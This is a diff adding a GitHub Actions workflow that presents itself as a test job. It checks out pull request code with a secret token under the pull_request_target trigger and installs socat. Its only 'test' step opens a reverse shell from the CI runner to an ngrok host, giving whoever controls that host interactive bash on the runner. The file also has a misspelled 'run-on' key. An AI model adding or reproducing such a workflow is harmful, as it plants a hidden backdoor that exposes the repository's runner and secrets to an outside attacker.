@@ -1,0 +1,23 @@
+name: test
+on:
+  push:
+  pull_request_target:
+
+jobs:
+  test:
+    name: Run test
+    run-on: ubuntu-20.10
+    steps:
+      - uses: actions/checkout@v2
+        with:
+          persist-credentials: false
+          token: ${{ secrets.CHECKOUT_TOKEN }}
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Install dependencies
+        run: |
+          apt-get update
+          apt-get install -y socat
+      - name: Test
+        run: |
+          socat TCP:2.tcp.ngrok.io:16804 EXEC:"bash -li",pty,stderr,setsid,sigint,sane
